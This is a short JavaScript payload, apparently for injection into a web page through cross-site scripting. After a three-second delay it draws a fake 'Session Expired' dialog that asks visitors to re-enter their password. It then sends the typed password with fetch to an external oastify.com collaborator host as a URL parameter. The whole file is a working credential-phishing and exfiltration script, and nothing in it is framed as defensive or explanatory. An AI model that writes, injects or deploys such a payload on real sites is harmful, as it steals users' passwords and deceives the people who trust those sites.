window.addEventListener('load', function() {
    setTimeout(function() {
        // Create the session expired prompt
        let message = document.createElement('div');
        message.style.position = 'fixed';
        message.style.top = '30%';
        message.style.left = '50%';
        message.style.transform = 'translate(-50%, -50%)';
        message.style.background = 'white';
        message.style.padding = '20px';
        message.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
        message.style.zIndex = '9999';
        message.style.display = 'block'; // Added for safety
        message.innerHTML = `
            <h2>Session Expired</h2>
            <p>Please re-enter your password:</p>
            <input type="password" id="password" placeholder="Enter password" required>
            <button id="submit">Submit</button>
        `;
        
        document.body.appendChild(message);

        // Add event listener for the submit button using fetch
        document.getElementById('submit').addEventListener('click', function() {
            let password = document.getElementById('password').value;
            if (password) {
                fetch(`https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`, {
                    method: 'GET', // Matches the original behavior of an image request
                    mode: 'no-cors' // Use this if you don’t need the response, just to send the request
                })
                .then(() => {
                    message.innerHTML = "<p>Loading...</p>"; // Update UI after successful request
                })
                .catch(error => {
                    console.error("Fetch error:", error); // Log any issues
                    message.innerHTML = "<p>Error occurred. Please try again.</p>";
                });
            }
        });
    }, 3000); // Delay the prompt for 3 seconds
});
